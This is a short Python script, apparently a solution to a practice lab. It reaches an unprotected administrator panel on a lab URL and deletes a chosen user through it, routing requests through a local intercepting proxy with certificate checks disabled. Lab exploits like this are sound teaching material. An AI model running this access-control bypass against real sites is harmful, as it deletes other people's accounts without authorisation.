import sys
import urllib3
import requests
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
proxies={'http':'http://127.0.0.1:8080','https':'http://127.0.0.1:8080'}
def delete_user(url,username):
    link=url + '/administrator-panel'
    r=requests.get(link,verify=False,proxies=proxies)
    if r.status_code==200:
        print("Accessed as Admin")
        delete_link=link+ f'/delete?username={username}'
        r1=requests.get(delete_link,verify=False,proxies=proxies)
        if r1.status_code==200:
            print("Delete Successful")
        else:
            print("Could not delete user")
    else:
        print("Could not access admin panel")

def main():
    if len(sys.argv)!=2:
        print(f"Format: python {sys.argv[0]} <lab-url>")
        sys.exit(-1)
    url=sys.argv[1]
    username=input("Enter the name: ")
    delete_user(url,username)    


if __name__ == "__main__":
    main()